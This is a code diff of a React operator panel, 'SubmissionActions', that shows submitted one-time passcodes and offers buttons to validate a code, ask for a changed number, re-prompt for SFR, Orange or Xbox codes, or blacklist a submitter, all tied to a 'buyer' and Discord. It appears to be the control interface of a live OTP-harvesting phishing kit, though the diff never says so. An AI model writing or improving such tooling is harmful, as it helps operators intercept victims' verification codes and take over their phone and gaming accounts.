@@ -1,6 +1,6 @@
 import { useState } from "react";
 import { motion } from "framer-motion";
-import { Send, Hash, Ban, Clock, X, Copy, Check, RefreshCw } from "lucide-react";
+import { Send, Hash, Ban, Clock, X, Copy, Check } from "lucide-react";
 import { base44 } from "@/api/base44Client";
 import { t } from "@/components/buyer/i18n";
 
@@ -64,7 +64,7 @@ export default function SubmissionActions({ sub, discord, lang, buyerId, onDone 
         setSentLabel(label);
         setResult(lang === "fr" ? "Action envoyée ✓" : "Action sent ✓");
         if (action === "valid" || action === "wrong") setTimeout(() => onDone?.(), 1200);
-        if (action === "resend") setTimeout(() => onDone?.({ reloadOnly: true }), 800);
+        else setTimeout(() => onDone?.({ reloadOnly: true }), 800);
       }
     } catch (err) {
       setIsError(true);
@@ -134,35 +134,39 @@ export default function SubmissionActions({ sub, discord, lang, buyerId, onDone 
           <CopyField label={lang === "fr" ? "Code OTP" : "OTP code"} value={sub.entered_code} bg="#f5f3ff" />
         </div>
 
-        <div className="space-y-2.5">
-          <button
-            onClick={() => runAction("valid")}
-            disabled={!!busy}
-            className="w-full flex items-center justify-center gap-2 px-3 py-3.5 rounded-xl text-sm font-bold transition-opacity disabled:opacity-50"
-            style={{ backgroundColor: "#059669", color: "#fff" }}
-          >
-            {busy === "valid" ? <span className="w-4 h-4 border-2 border-white/40 border-t-white rounded-full animate-spin" /> : <Check className="w-4 h-4" />}
-            {lang === "fr" ? "Approuver & vérifier" : "Approve OTP & verify"}
-          </button>
-          <button
-            onClick={() => runAction("resend")}
-            disabled={!!busy}
-            className="w-full flex items-center justify-center gap-2 px-3 py-3.5 rounded-xl text-sm font-bold transition-opacity disabled:opacity-50"
-            style={{ backgroundColor: "#d97706", color: "#fff" }}
-          >
-            {busy === "resend" ? <span className="w-4 h-4 border-2 border-white/40 border-t-white rounded-full animate-spin" /> : <RefreshCw className="w-4 h-4" />}
-            {lang === "fr" ? "Code invalide — autoriser renvoi" : "Invalid OTP — allow resend"}
-          </button>
-          <button
-            onClick={() => runAction("wrong")}
-            disabled={!!busy}
-            className="w-full flex items-center justify-center gap-2 px-3 py-3.5 rounded-xl text-sm font-bold bg-transparent transition-colors disabled:opacity-50"
-            style={{ border: "1.5px solid #e11d48", color: "#e11d48" }}
-          >
-            {busy === "wrong" ? <span className="w-4 h-4 border-2 border-red-300 border-t-red-500 rounded-full animate-spin" /> : <X className="w-4 h-4" />}
-            {lang === "fr" ? "Rejeter la demande" : "Reject request"}
-          </button>
+        <div className="grid grid-cols-2 gap-2.5">
+          {[
+            { key: "valid", label: lang === "fr" ? "Valider le code" : "Validate code", icon: Check, style: { backgroundColor: "#059669", color: "#fff" } },
+            { key: "wrong", label: lang === "fr" ? "Changer le numéro" : "Change number", icon: X, style: { backgroundColor: "#e74c3c", color: "#fff" } },
+            { key: "code_ready", label: lang === "fr" ? "Renvoyer (4 ch.)" : "Resend (4)", icon: Send, style: { backgroundColor: "#00a86b", color: "#fff" } },
+            { key: "code6sfr", label: lang === "fr" ? "Renvoyer (SFR)" : "Resend (SFR)", icon: Hash, style: { backgroundColor: "#e74c3c", color: "#fff" } },
+            { key: "code6orange", label: lang === "fr" ? "Renvoyer (Orange)" : "Resend (Orange)", icon: Hash, style: { backgroundColor: "#ff6600", color: "#fff" } },
+            { key: "code6", label: lang === "fr" ? "Renvoyer (Xbox)" : "Resend (Xbox)", icon: Hash, style: { backgroundColor: "#9b59b6", color: "#fff" } },
+          ].map((a) => {
+            const Icon = a.icon;
+            return (
+              <button
+                key={a.key}
+                onClick={() => runAction(a.key)}
+                disabled={!!busy}
+                className="flex items-center justify-center gap-2 px-3 py-3 rounded-xl text-xs font-bold hover:opacity-90 transition-opacity disabled:opacity-50"
+                style={a.style}
+              >
+                {busy === a.key ? <span className="w-3.5 h-3.5 border-2 border-white/40 border-t-white rounded-full animate-spin" /> : <Icon className="w-3.5 h-3.5" />}
+                {a.label}
+              </button>
+            );
+          })}
         </div>
+        <button
+          onClick={runBlacklist}
+          disabled={!!busy}
+          className="w-full mt-2.5 flex items-center justify-center gap-2 px-3 py-3 rounded-xl text-xs font-bold bg-transparent transition-colors disabled:opacity-50"
+          style={{ border: "1.5px solid #e74c3c", color: "#e74c3c" }}
+        >
+          {busy === "blacklist" ? <span className="w-3.5 h-3.5 border-2 border-red-300 border-t-red-500 rounded-full animate-spin" /> : <Ban className="w-3.5 h-3.5" />}
+          {t(lang, "blacklist")}
+        </button>
 
         {result && (
           <div
